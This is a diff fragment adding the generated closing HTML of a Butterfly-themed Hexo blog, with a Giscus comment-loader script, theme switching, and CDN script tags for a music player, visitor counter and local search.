+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"mapping":"pathname","strict":0,"reactions_enabled":1,"emit_metadata":0,"input_position":"top","lang":"zh-CN"}
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'sereniusx/sereniusx.github.io',
+      'data-repo-id': 'R_kgDOQCvQvQ',
+      'data-category-id': 'DIC_kwDOQCvQvc4C1pNr',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="/js/post-meta.js"></script><script src="/js/bg-duotone.js"></script><script src="/js/post-meta.js"></script><script src="/js/heatmap.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
